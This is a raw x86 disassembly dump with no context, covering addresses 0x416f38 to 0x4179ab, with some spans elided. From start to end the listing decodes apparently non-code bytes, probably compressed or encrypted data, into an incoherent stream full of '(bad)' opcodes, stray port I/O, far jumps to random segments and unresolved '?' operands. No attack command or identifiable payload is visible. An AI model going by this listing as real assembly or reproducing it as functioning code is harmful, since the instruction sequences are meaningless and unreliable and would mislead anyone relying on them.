  416f38:	arpl   WORD PTR [ebx+0x5c],bp
  416f3b:	loop   0x416f5a
  416f3d:	leave  
  416f3e:	add    DWORD PTR [edi+0x5f],eax
  416f41:	cld    
  416f42:	cmc    
  416f43:	outs   dx,BYTE PTR ds:[esi]
  416f44:	lea    ebx,ds:0xacf90aa5
  416f4a:	or     BYTE PTR [esp],bh
  416f4d:	test   BYTE PTR [eax],ah
  416f4f:	lods   eax,DWORD PTR ds:[esi]
  416f50:	mov    bl,0xd2
  416f52:	in     al,dx
  416f53:	xchg   edx,eax
  416f54:	sub    DWORD PTR [ebx],ebx
  416f56:	pop    ss
  416f57:	test   BYTE PTR [ecx+0x41],cl
  416f5a:	push   esi
  416f5b:	adc    eax,0x983c18b9
  416f60:	test   BYTE PTR [edi+0x62743a74],bl
  416f66:	lock mov ebp,DWORD PTR [edx+0x79]
  416f6a:	and    BYTE PTR [eax],cl
  416f6c:	sub    BYTE PTR [ebx+ebx*8+0xb947586],0x50
  416f74:	lea    ebx,[ebx-0x7ea9e032]
  416f7a:	mov    al,ds:0xe9fd135f
  416f7f:	imul   ebp,DWORD PTR ds:0x9be407c,0xf293682f
  416f89:	pop    ss
  416f8a:	cmp    ah,BYTE PTR [edi-0x7605e354]
  416f90:	cmp    esp,DWORD PTR [esi+0x12cc8b40]
  416f96:	daa    
  416f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f98:	adc    eax,0x222ac36d
  416f9d:	mov    ebp,0xbb43b79
  416fa2:	stos   BYTE PTR es:[edi],al
  416fa3:	gs into 
  416fa5:	sub    esi,DWORD PTR [edx]
  416fa7:	and    eax,0xbe9ada83
  416fac:	test   BYTE PTR [edi],0x47
  416faf:	mov    bl,0xf7
  416fb1:	pop    ecx
  416fb2:	dec    cl
  416fb4:	jae    0x416ff1
  416fb6:	xchg   edi,eax
  416fb7:	jno    0x416f5e
  416fb9:	cli    
  416fba:	in     eax,dx
  416fbb:	les    esi,FWORD PTR [ebx+0x270b7e50]
  416fc1:	std    
  416fc2:	jge    0x41703f
  416fc4:	adc    eax,0xdfc43009
  416fc9:	(bad)  
  416fca:	loope  0x416f67
  416fcc:	aad    0xa8
  416fce:	inc    esi
  416fcf:	ficomp DWORD PTR [ecx+0x72831181]
  416fd5:	jb     0x416f79
  416fd7:	cdq    
  416fd8:	xlat   BYTE PTR ds:[ebx]
  416fd9:	pushf  
  416fda:	cwde   
  416fdb:	mov    ch,BYTE PTR [edi]
  416fdd:	popf   
  416fde:	pop    edx
  416fdf:	pop    ds
  416fe0:	sbb    eax,DWORD PTR [ecx-0x7d]
  416fe3:	mov    ebp,0xb6739e4f
  416fe8:	into   
  416fe9:	sar    DWORD PTR [ecx+0x167aa913],cl
  416fef:	add    BYTE PTR [edx],dl
  416ff1:	push   edi
  416ff2:	mov    ebx,DWORD PTR [ebx]
  416ff4:	xor    DWORD PTR [ecx+0x18ef65bc],ecx
  416ffa:	push   ss
  416ffb:	add    ebp,ebp
  416ffd:	mov    ds:0x431bea3e,al
  417002:	fnsave [edx+0x243d2d63]
  417008:	int3   
  417009:	push   ecx
  41700a:	cmp    esi,DWORD PTR [eax]
  41700c:	mov    ?,WORD PTR [ebp-0x14]
  41700f:	test   BYTE PTR [edx+0x0],0x0
	...
  417072:	add    BYTE PTR [eax],al
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esp,ebx
  417081:	test   DWORD PTR [esi],eax
  417083:	test   BYTE PTR [ecx+0x50000f3],0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	xchg   DWORD PTR [ecx+edx*2-0x78],ecx
  417090:	dec    esi
  417091:	cmp    DWORD PTR [eax],edi
  417093:	or     BYTE PTR [esi-0x3036640b],bl
  417099:	sub    DWORD PTR [esi-0x3e],edx
  41709c:	adc    BYTE PTR [edx-0x484b216f],al
  4170a2:	add    DWORD PTR [ebp+0x30],ebp
  4170a5:	daa    
  4170a6:	add    ch,bh
  4170a8:	cmp    edx,eax
  4170aa:	mov    dl,0xbe
  4170ac:	sbb    al,0x85
  4170ae:	(bad)  
  4170af:	pop    esp
  4170b0:	retf   0x3d51
  4170b3:	cs xchg edi,eax
  4170b5:	pop    ds
  4170b6:	call   0x6c57:0x348bda14
  4170bd:	out    0xe8,al
  4170bf:	lock dec DWORD PTR [edx-0x4]
  4170c3:	ins    DWORD PTR es:[edi],dx
  4170c4:	inc    edx
  4170c5:	ret    0xd7d7
  4170c8:	stc    
  4170c9:	jnp    0x4170bf
  4170cb:	shl    BYTE PTR [edx+0x38],cl
  4170ce:	out    0x54,eax
  4170d0:	(bad)  
  4170d1:	imul   eax,DWORD PTR [edi-0x17d041c5],0x61eb9f2f
  4170db:	sub    al,0xd8
  4170dd:	sbb    BYTE PTR [edi],0x94
  4170e0:	out    dx,al
  4170e1:	out    0x29,eax
  4170e3:	pusha  
  4170e4:	mov    fs,eax
  4170e6:	xor    dh,dl
  4170e8:	mov    bh,0x49
  4170ea:	ror    BYTE PTR [edx],0x90
  4170ed:	mov    eax,ds:0xa6202926
  4170f2:	mov    ah,0x1f
  4170f4:	or     DWORD PTR [edi+0x32],esp
  4170f7:	xchg   DWORD PTR [eax-0x70],ecx
  4170fa:	jmp    0x4170e0
  4170fc:	fsubr  st(5),st
  4170fe:	adc    eax,0xdf165b3f
  417103:	pop    esi
  417104:	dec    edx
  417105:	mov    bl,0xde
  417107:	xor    DWORD PTR [edi-0x64de892e],esp
  41710d:	test   ah,ah
  41710f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417110:	mov    eax,ds:0xdca58c49
  417115:	jo     0x4170e9
  417117:	xchg   edx,eax
  417118:	inc    edi
  417119:	dec    edi
  41711a:	add    DWORD PTR [eax+0x12a0847a],esi
  417120:	jns    0x41711d
  417122:	out    0xc4,al
  417124:	add    eax,DWORD PTR [eax+0x5aa51fb8]
  41712a:	mov    bl,0x33
  41712c:	lods   al,BYTE PTR ds:[esi]
  41712d:	inc    ecx
  41712e:	frstor [ecx]
  417130:	mov    WORD PTR [edx+ecx*4],es
  417133:	cs je  0x4170bf
  417136:	shl    BYTE PTR [edi-0x73],1
  417139:	aaa    
  41713a:	cmp    DWORD PTR [edx+edi*8+0xdc2a0b7],ebp
  417141:	nop
  417142:	cmp    BYTE PTR [esi-0x7236810],al
  417148:	fdiv   st(5),st
  41714a:	fbstp  TBYTE PTR [eax+0x533770a2]
  417150:	out    dx,eax
  417151:	mov    al,ds:0x25b6c819
  417156:	mov    cl,0xcf
  417158:	pop    es
  417159:	mov    BYTE PTR [esi+eiz*4-0x54],ah
  41715d:	retf   0xc557
  417160:	adc    al,0xf5
  417162:	dec    edx
  417163:	in     al,0xce
  417165:	mov    dh,0x21
  417167:	push   ecx
  417168:	cld    
  417169:	jae    0x4171bd
  41716b:	mov    ah,0x8a
  41716d:	mov    edi,DWORD PTR [eax]
  41716f:	xchg   DWORD PTR [ebx-0x42],edx
  417172:	add    al,0x72
  417174:	lahf   
  417175:	icebp  
  417176:	mov    eax,0x3c255f11
  41717b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41717d:	inc    esi
  41717e:	sub    ecx,ebx
  417180:	sahf   
  417181:	mov    edi,0x689a7d13
  417186:	pop    ebx
  417187:	pushf  
  417188:	push   ss
  417189:	out    dx,eax
  41718a:	and    eax,0x47f7bd00
  41718f:	mov    ebx,0xd5
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	jmp    0xf4:0x86715515
  417207:	add    BYTE PTR ds:0x68000001,al
  41720d:	arpl   bp,sp
  41720f:	mov    cl,0x8e
  417211:	sbb    DWORD PTR [eax+edi*4+0x1d],edx
  417215:	(bad)  
  417216:	push   0xdf11ef3c
  41721b:	call   0x77c7:0x35787096
  417222:	sti    
  417223:	sti    
  417224:	icebp  
  417225:	cmp    BYTE PTR [edi+edx*1],dl
  417228:	stc    
  417229:	xchg   BYTE PTR ds:0x7b6deef8,dh
  41722f:	imul   ebx,DWORD PTR [ebx-0x642b10de],0xc7b594b4
  417239:	xchg   DWORD PTR [ebx],eax
  41723b:	(bad)  
  41723c:	mov    bh,0x4f
  41723e:	mov    cl,0xca
  417240:	(bad)  
  417241:	int    0x42
  417243:	cmc    
  417244:	push   es
  417245:	xchg   BYTE PTR [eax],ch
  417247:	in     al,0xcb
  417249:	pop    edi
  41724a:	sbb    eax,0xdd10a3b
  41724f:	les    esp,FWORD PTR [esi]
  417251:	aad    0xad
  417253:	dec    eax
  417254:	sbb    eax,0xf580b3f6
  417259:	sbb    DWORD PTR [eax+0x4c],edi
  41725c:	jg     0x417283
  41725e:	fcomip st,st(2)
  417260:	outs   dx,BYTE PTR ds:[esi]
  417261:	and    BYTE PTR [ebx-0x49],0xbd
  417265:	lods   al,BYTE PTR ds:[esi]
  417266:	and    al,bh
  417268:	enter  0xcef4,0xcb
  41726c:	and    dh,dl
  41726e:	fldenv [edx]
  417270:	jo     0x417293
  417272:	cmp    BYTE PTR [ecx+0x35],cl
  417275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417276:	mov    ebx,0x40cad5cd
  41727b:	xor    edi,ebx
  41727d:	imul   ebx,DWORD PTR [ebp-0x16034b11],0xe90295f0
  417287:	icebp  
  417288:	cmp    eax,DWORD PTR [esi+0x8]
  41728b:	popf   
  41728c:	ins    BYTE PTR es:[edi],dx
  41728d:	mov    BYTE PTR [ebp+0x1c],ch
  417290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417291:	loop   0x417279
  417293:	retf   
  417294:	aad    0xb3
  417296:	adc    DWORD PTR [edx-0xe1b3f96],ebp
  41729c:	stos   DWORD PTR es:[edi],eax
  41729d:	fst    DWORD PTR [edi+0x71]
  4172a0:	lea    edi,[edi]
  4172a2:	mov    esp,0xeba61bfb
  4172a7:	bound  edx,QWORD PTR [ebx+0x612a0012]
  4172ad:	xchg   DWORD PTR [edi],ebx
  4172af:	shl    esp,1
  4172b1:	in     eax,dx
  4172b2:	and    eax,0x11e11a63
  4172b7:	jmp    0xadbc:0x61830b4e
  4172be:	push   ds
  4172bf:	xor    al,0xd
  4172c1:	out    0xaa,eax
  4172c3:	cld    
  4172c4:	test   BYTE PTR [bp+0x2a],dl
  4172c8:	xchg   DWORD PTR [ebp-0x63988408],esp
  4172ce:	push   ds
  4172cf:	cmp    edx,edx
  4172d1:	pop    edx
  4172d2:	imul   eax,DWORD PTR [esi+0x39c45e41],0xffffffe6
  4172d9:	or     bh,BYTE PTR [ebx+esi*8]
  4172dc:	pop    ebp
  4172dd:	jnp    0x417298
  4172df:	inc    ecx
  4172e0:	iret   
  4172e1:	arpl   cx,di
  4172e3:	sub    al,ah
  4172e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172e6:	loopne 0x417310
  4172e8:	sub    BYTE PTR [eax],0x59
  4172eb:	ds xor eax,0x81b1bcde
  4172f1:	mov    esp,0xd9f347c0
  4172f6:	inc    ecx
  4172f7:	(bad)  
  4172f8:	out    0x15,eax
  4172fa:	mov    dl,BYTE PTR [esi-0x5d0e0db9]
  417300:	push   0xffffffb2
  417302:	mov    WORD PTR cs:[ecx-0x37],?
  417306:	out    dx,eax
  417307:	test   BYTE PTR [esi],0xf3
  41730a:	daa    
  41730b:	mov    ecx,es
  41730d:	nop
  41730e:	retf   
  41730f:	(bad)  
  417310:	mov    es,WORD PTR [eax]
	...
  417372:	add    BYTE PTR [eax],al
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	add    DWORD PTR gs:[edx+edi*1-0x4b],edi
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x40000001
  41738d:	mov    dh,0x3d
  41738f:	sbb    eax,0x73a28571
  417394:	rcr    BYTE PTR [ebx+0x6e8f3525],cl
  41739a:	inc    eax
  41739b:	imul   esp,esp,0xffffffd3
  41739e:	ss sbb eax,0xf48dbd10
  4173a4:	(bad)  
  4173a5:	sub    dh,dl
  4173a7:	or     BYTE PTR ds:0xe514b727,ch
  4173ad:	mov    ebx,0xaf77f6bb
  4173b2:	rcr    ch,1
  4173b4:	ror    ecx,1
  4173b6:	and    al,0xe9
  4173b8:	sar    BYTE PTR [ecx],cl
  4173ba:	inc    ecx
  4173bb:	mov    ecx,0x3fea29d5
  4173c0:	mov    al,0xe9
  4173c2:	and    ebp,0xffffffd5
  4173c5:	jb     0x4173fc
  4173c7:	fs jns 0x4173ea
  4173ca:	xor    dl,BYTE PTR [edi+edx*4]
  4173cd:	push   es
  4173ce:	ins    DWORD PTR es:[edi],dx
  4173cf:	fld    DWORD PTR [edx]
  4173d1:	sub    cl,BYTE PTR [edx-0x14]
  4173d4:	mov    ss,WORD PTR [esi+ecx*2]
  4173d7:	out    dx,al
  4173d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d9:	sbb    DWORD PTR [ebp+0x46],esp
  4173dc:	push   ebx
  4173dd:	dec    eax
  4173de:	fldz   
  4173e0:	jne    0x4173fb
  4173e2:	pop    esi
  4173e3:	cld    
  4173e4:	sub    BYTE PTR [ebx+0x70],al
  4173e7:	js     0x41742c
  4173e9:	jge    0x41737d
  4173eb:	jne    0x417421
  4173ed:	sbb    eax,0x82133483
  4173f2:	add    DWORD PTR [eax],ecx
  4173f4:	ret    0x9893
  4173f7:	xor    eax,0x88667015
  4173fc:	mov    DWORD PTR [edx-0x1],ebx
  4173ff:	jb     0x417427
  417401:	sub    esi,ebp
  417403:	outs   dx,BYTE PTR ds:[esi]
  417404:	pop    ebp
  417405:	fisub  DWORD PTR [ecx-0xa]
  417408:	imul   DWORD PTR [edi*8-0x5d855f3d]
  41740f:	jo     0x417438
  417411:	popa   
  417412:	xchg   edx,eax
  417413:	(bad)  cs:[esi-0x6d]
  417417:	loopne 0x417460
  417419:	hlt    
  41741a:	cld    
  41741b:	dec    esi
  41741c:	fmul   QWORD PTR ds:0xd82fb9cc
  417422:	xchg   ecx,eax
  417423:	sub    ebx,DWORD PTR [edi+0x67582f3b]
  417429:	xchg   esi,eax
  41742a:	dec    ebp
  41742b:	mov    edx,0xa5654dd6
  417430:	inc    edx
  417431:	push   0xffffffd7
  417433:	jo     0x417455
  417435:	icebp  
  417436:	xor    eax,0x7d7aacd6
  41743b:	ins    BYTE PTR es:[edi],dx
  41743c:	int    0x2
  41743e:	(bad)
  417441:	adc    DWORD PTR [edi-0x7e],ecx
  417444:	retf   0xc3e2
  417447:	les    edi,FWORD PTR [edx]
  417449:	xchg   ebx,eax
  41744a:	inc    edi
  41744b:	sbb    al,0xa2
  41744d:	cwde   
  41744e:	dec    ebx
  41744f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417450:	push   ecx
  417451:	push   ds
  417452:	xlat   BYTE PTR ds:[ebx]
  417453:	add    eax,0xc476bfe
  417458:	pop    ds
  417459:	rcl    BYTE PTR [edx],0x26
  41745c:	clc    
  41745d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41745e:	sbb    al,0xab
  417460:	adc    eax,0xe20f9c24
  417465:	test   eax,0xd4c6aeff
  41746a:	out    0x5d,eax
  41746c:	sbb    al,0xe
  41746e:	mov    BYTE PTR [ecx+esi*1],dl
  417471:	dec    edx
  417472:	outs   dx,DWORD PTR ds:[esi]
  417473:	push   es
  417474:	fdivr  DWORD PTR [ebx-0x64]
  417477:	enter  0x2214,0xec
  41747b:	test   DWORD PTR [ebx+0x62],ebp
  41747e:	aas    
  41747f:	js     0x41743b
  417481:	lock mov edi,0x64cd1ef5
  417487:	mov    ds:0xf3658570,eax
  41748c:	pop    esp
  41748d:	sti    
  41748e:	(bad)  [edx]
  417490:	cmp    eax,0x0
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	add    BYTE PTR [eax],al
  417502:	inc    eax
  417503:	daa    
  417504:	nop
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0xff000001
  41750d:	sub    edi,DWORD PTR [edi-0x2410845a]
  417513:	lods   eax,DWORD PTR ds:[esi]
  417514:	test   bh,dh
  417516:	int3   
  417517:	retf   
  417518:	xchg   DWORD PTR [ebx+0x25718ae8],ebx
  41751e:	mov    ecx,0x64df672e
  417523:	scas   eax,DWORD PTR es:[edi]
  417524:	sbb    BYTE PTR [esi+0x2],bh
  417527:	fs ds aas 
  41752a:	out    dx,al
  41752b:	repnz inc ecx
  41752d:	(bad)  
  41752e:	rcl    BYTE PTR [edx+0x4b758999],cl
  417534:	mov    ss,WORD PTR [ebx]
  417536:	ins    BYTE PTR es:[edi],dx
  417537:	dec    edx
  417538:	test   BYTE PTR [esi],ah
  41753a:	inc    ecx
  41753b:	test   BYTE PTR [edi+0x7d3879c8],ch
  417541:	jecxz  0x4175aa
  417543:	inc    ebx
  417544:	test   al,0x92
  417546:	cs jge 0x4174ef
  417549:	pop    ebx
  41754a:	mov    al,ds:0xd5d8668c
  41754f:	sbb    DWORD PTR [edi+0x28],0xb8f05746
  417556:	ss test al,0x96
  417559:	xlat   BYTE PTR ds:[ebx]
  41755a:	fs jb  0x417507
  41755d:	mov    ebp,ds
  41755f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417560:	iret   
  417561:	jno    0x41754f
  417563:	inc    ebp
  417564:	mov    ds:0x9c42187a,eax
  417569:	mov    dh,0xe2
  41756b:	add    al,0x38
  41756d:	das    
  41756e:	rcl    cl,1
  417570:	cmp    al,0xed
  417572:	ror    DWORD PTR [eax+0x1e8d5d1d],cl
  417578:	xchg   edx,eax
  417579:	push   eax
  41757a:	sub    edi,0xc6e56fbc
  417580:	jle    0x4175b3
  417582:	xor    dl,dl
  417584:	jecxz  0x417515
  417586:	call   0x22dd13d3
  41758b:	movntps XMMWORD PTR [esi],xmm5
  41758e:	mov    eax,0xc07f1ce4
  417593:	inc    ebx
  417594:	xlat   BYTE PTR ds:[ebx]
  417595:	adc    eax,0x1f221602
  41759a:	dec    eax
  41759b:	ret    
  41759c:	in     eax,dx
  41759d:	push   cs
  41759e:	xor    DWORD PTR [edi-0x15],edi
  4175a1:	sbb    al,0x70
  4175a3:	pop    es
  4175a4:	inc    edx
  4175a5:	test   al,0xee
  4175a7:	sub    al,0x21
  4175a9:	push   0x12
  4175ab:	xor    ebx,DWORD PTR [eax-0x1d]
  4175ae:	(bad)  
  4175af:	adc    al,0xf5
  4175b1:	hlt    
  4175b2:	out    0xa7,eax
  4175b4:	xchg   edi,eax
  4175b5:	loopne 0x417599
  4175b7:	mov    ecx,0x5033d810
  4175bc:	(bad)  
  4175bd:	xor    eax,DWORD PTR [ebx+0xf]
  4175c0:	pop    ecx
  4175c1:	inc    ebp
  4175c2:	mov    cl,0x69
  4175c4:	mov    ah,0x23
  4175c6:	ret    
  4175c7:	mov    edx,0xba269d1d
  4175cc:	xchg   edx,eax
  4175cd:	pop    ss
  4175ce:	pop    eax
  4175cf:	xchg   DWORD PTR [ecx],esp
  4175d1:	xlat   BYTE PTR ds:[ebx]
  4175d2:	nop
  4175d3:	pop    esi
  4175d4:	test   eax,0xcf1bcdcf
  4175d9:	dec    eax
  4175da:	sub    ebp,eax
  4175dc:	push   0xffffff87
  4175de:	and    DWORD PTR [ecx+0x2ebc37d9],ecx
  4175e4:	push   eax
  4175e5:	or     al,0xd3
  4175e7:	popf   
  4175e8:	retf   
  4175e9:	inc    edi
  4175ea:	into   
  4175eb:	mov    edi,0x2a4f333a
  4175f0:	dec    esi
  4175f1:	dec    ebx
  4175f2:	push   cs
  4175f3:	jbe    0x417599
  4175f5:	pop    edx
  4175f6:	pushf  
  4175f7:	inc    eax
  4175f8:	nop
  4175f9:	mov    eax,ds:0x54a60e65
  4175fe:	int    0xa6
  417600:	ins    BYTE PTR es:[edi],dx
  417601:	scas   al,BYTE PTR es:[edi]
  417602:	fdivp  st(2),st
  417604:	adc    DWORD PTR [esi],ebp
  417606:	loop   0x41760e
  417608:	bswap  esp
  41760a:	mov    edi,0x5c2648ca
  41760f:	out    dx,al
  417610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fiadd  DWORD PTR [eax-0x6adf12a2]
  417685:	test   DWORD PTR [eax],0x10500
  41768b:	add    BYTE PTR [edi],dl
  41768d:	or     DWORD PTR [eax+0x29],edi
  417690:	test   eax,0x7d7fdb3b
  417695:	ret    0xd323
  417698:	adc    edi,DWORD PTR [edi]
  41769a:	and    al,0xed
  41769c:	out    dx,eax
  41769d:	jb     0x417703
  41769f:	adc    al,dl
  4176a1:	mov    cl,0x98
  4176a3:	mov    ds:0x2e706ce9,eax
  4176a8:	int3   
  4176a9:	fcomp  QWORD PTR [edx-0x7a]
  4176ac:	mov    ebp,0x64faa006
  4176b1:	cld    
  4176b2:	xlat   BYTE PTR ds:[ebx]
  4176b3:	imul   esp,DWORD PTR [ecx-0x715579e],0x71d285e6
  4176bd:	mov    ebp,0x866e2bb0
  4176c2:	les    ebp,FWORD PTR [ebx+0x7ac78363]
  4176c8:	sahf   
  4176c9:	cmp    eax,0x562173fa
  4176ce:	sub    edi,edx
  4176d0:	cli    
  4176d1:	leave  
  4176d2:	push   edi
  4176d3:	test   eax,0xda2a701
  4176d8:	pop    edi
  4176d9:	in     al,dx
  4176da:	in     al,dx
  4176db:	sbb    ebp,esi
  4176dd:	push   ebp
  4176de:	ja     0x4176ff
  4176e0:	or     BYTE PTR [edx-0x58],cl
  4176e3:	into   
  4176e4:	cmp    al,0x3e
  4176e6:	inc    esi
  4176e7:	push   0xffffffcf
  4176e9:	lods   al,BYTE PTR ds:[esi]
  4176ea:	lods   al,BYTE PTR ds:[esi]
  4176eb:	in     al,dx
  4176ec:	push   ds
  4176ed:	sbb    BYTE PTR [ebx-0x385eafaa],0xe8
  4176f4:	cmc    
  4176f5:	push   ebp
  4176f6:	inc    esp
  4176f7:	pop    ss
  4176f8:	or     DWORD PTR [esi+edi*8+0x74eb3a9b],edi
  4176ff:	mov    ch,0x3b
  417701:	es xchg ebx,eax
  417703:	pop    esp
  417704:	sub    esp,edx
  417706:	nop
  417707:	xor    DWORD PTR [edi+eax*2-0x24],ebp
  41770b:	dec    esp
  41770c:	fs hlt 
  41770e:	sbb    BYTE PTR [ebx],cl
  417710:	mov    cl,0xfa
  417712:	ret    0x904a
  417715:	jl     0x4176d0
  417717:	mov    WORD PTR [edx+0x2a],ss
  41771a:	dec    ebx
  41771b:	jp     0x41776b
  41771d:	clc    
  41771e:	pop    ebx
  41771f:	stc    
  417720:	push   0x7855bf13
  417725:	push   ss
  417726:	stos   DWORD PTR es:[edi],eax
  417727:	aad    0xff
  417729:	pop    ebx
  41772a:	dec    edx
  41772b:	mov    dl,0x94
  41772d:	jae    0x4176c7
  41772f:	repz lea esi,[ebp-0x18]
  417733:	scas   eax,DWORD PTR es:[edi]
  417734:	rcr    DWORD PTR [edx+ecx*8],1
  417737:	ror    DWORD PTR [esi+ebp*8-0x26],0xdf
  41773c:	popf   
  41773d:	iret   
  41773e:	push   ebx
  41773f:	fld    TBYTE PTR [edx]
  417741:	js     0x417766
  417743:	jmp    0x41773f
  417745:	nop
  417746:	pushf  
  417747:	or     esi,DWORD PTR [ecx]
  417749:	int    0x1d
  41774b:	hlt    
  41774c:	mov    ds:0x354f5257,eax
  417751:	push   DWORD PTR [ecx-0x509e34c7]
  417757:	icebp  
  417758:	push   0xc7e924f
  41775d:	(bad)  
  41775e:	clc    
  41775f:	icebp  
  417760:	adc    ch,BYTE PTR [edx+edi*1+0x5f57b73c]
  417767:	adc    ecx,DWORD PTR [eax-0x2dea3259]
  41776d:	(bad)  
  41776e:	pop    ds
  41776f:	mov    al,ds:0xdbf4d28
  417774:	data16 fwait
  417776:	mov    dh,BYTE PTR [eax+ebp*8-0x16]
  41777a:	mov    dh,0x61
  41777c:	push   0x4915b508
  417781:	and    al,0x6d
  417784:	inc    esi
  417785:	ret    
  417786:	jmp    0x7e5d:0xb98c4671
  41778d:	pusha  
  41778e:	mov    al,ds:0x8e57
	...
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	rcl    BYTE PTR [esi-0x78],cl
  417802:	aam    0x70
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [ecx+0x68eb4887],ah
  417811:	pop    edx
  417812:	into   
  417813:	add    al,0x86
  417815:	sar    DWORD PTR [ebx-0x5],1
  417818:	mov    esi,0x24cb608a
  41781d:	cmp    bl,0xe9
  417820:	imul   esi,DWORD PTR [esi+ecx*1],0x999a7a47
  417827:	rcr    DWORD PTR [ebp-0x3d],0x42
  41782b:	fld    TBYTE PTR [edx]
  41782d:	imul   esi,DWORD PTR [ebx+edx*2],0x1b
  417831:	push   eax
  417832:	sar    DWORD PTR [esi+ebx*1-0x3bb8bc4d],cl
  417839:	popa   
  41783a:	jmp    0x3658b492
  41783f:	push   ecx
  417840:	jae    0x417822
  417842:	xlat   BYTE PTR ds:[ebx]
  417843:	jge    0x417826
  417845:	mov    ebx,0x216ebbd4
  41784a:	and    DWORD PTR [esi+0x9],ebp
  41784d:	push   edi
  41784e:	and    ecx,DWORD PTR [ebp+0x61a2c166]
  417854:	loop   0x417852
  417856:	push   esi
  417857:	in     eax,0xaf
  417859:	call   0x60cd:0x5d6c137d
  417860:	sar    DWORD PTR [ebx+0x70],cl
  417863:	clc    
  417864:	push   ebp
  417865:	adc    BYTE PTR [ecx-0x7c70c6c3],bh
  41786b:	mov    gs,eax
  41786d:	inc    DWORD PTR [ebp+0x7e]
  417870:	aas    
  417871:	dec    BYTE PTR [ebx]
  417873:	xchg   esi,eax
  417874:	and    al,0xb9
  417876:	retf   0xa307
  417879:	push   ss
  41787a:	cs aas 
  41787c:	aas    
  41787d:	lods   eax,DWORD PTR ds:[esi]
  41787e:	test   DWORD PTR [ebp-0xde8093e],esp
  417884:	repz inc eax
  417886:	out    0x98,eax
  417888:	enter  0x1650,0x2a
  41788c:	cld    
  41788d:	and    BYTE PTR ds:0xfd545fba,0xc7
  417894:	mov    ds:0x482f042f,eax
  417899:	jbe    0x41789b
  41789b:	sbb    BYTE PTR [edi+0x26],dh
  41789e:	lods   eax,DWORD PTR ds:[esi]
  41789f:	xchg   DWORD PTR [ebx-0x7090b00b],ecx
  4178a5:	loop   0x4178de
  4178a7:	inc    edx
  4178a8:	pop    ds
  4178a9:	sar    BYTE PTR [ecx-0x36],1
  4178ac:	pop    edx
  4178ad:	data16 int 0x76
  4178b0:	add    ch,BYTE PTR [ebx+0x4cd0627c]
  4178b6:	aas    
  4178b7:	into   
  4178b8:	sbb    eax,0xc4602154
  4178bd:	adc    BYTE PTR [ebx+0x31],cl
  4178c0:	mov    ebp,esi
  4178c2:	adc    cl,ah
  4178c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c5:	mov    dl,0x37
  4178c7:	fwait
  4178c8:	lods   al,BYTE PTR ds:[esi]
  4178c9:	lods   al,BYTE PTR ds:[esi]
  4178ca:	sahf   
  4178cb:	pushf  
  4178cc:	imul   esp,DWORD PTR [ebp+0x687f73d4],0xffffffc5
  4178d3:	shl    BYTE PTR [edx],1
  4178d5:	xchg   ebp,eax
  4178d6:	pop    ss
  4178d7:	xor    ebp,DWORD PTR [eax]
  4178d9:	cmp    eax,0x59
  4178dc:	jmp    0x417893
  4178de:	or     edi,DWORD PTR [ebp+0x3e]
  4178e1:	xlat   BYTE PTR ds:[ebx]
  4178e2:	xor    eax,0x23a33893
  4178e7:	or     eax,DWORD PTR [eax]
  4178e9:	add    ecx,edx
  4178eb:	fnstcw WORD PTR [edx+0x20]
  4178ee:	loop   0x417906
  4178f0:	xor    eax,0xc4d86257
  4178f5:	push   ecx
  4178f6:	icebp  
  4178f7:	test   eax,0x4096a2f5
  4178fc:	rol    BYTE PTR [ebx-0x5cec5d23],1
  417902:	push   ebx
  417903:	push   esp
  417904:	popa   
  417905:	inc    ebp
  417906:	push   edi
  417907:	mov    WORD PTR [esi-0x5da53fff],?
  41790d:	adc    al,0x8
  41790f:	pop    ss
  417910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	pop    ebx
  417981:	bound  ebp,QWORD PTR [ebx+0xf99f31]
  417987:	add    BYTE PTR ds:0x6b000001,al
  41798d:	aam    0x71
  41798f:	xor    al,0xdc
  417991:	mov    esp,0x80886fec
  417996:	int3   
  417997:	cmp    DWORD PTR [esi+0x6eb9c742],0x5f9dfd1b
  4179a1:	es dec ebx
  4179a3:	mov    ah,0x18
  4179a5:	cld    
  4179a6:	mov    al,ds:0xe4b70cdd
  4179ab:	or     al,0xac
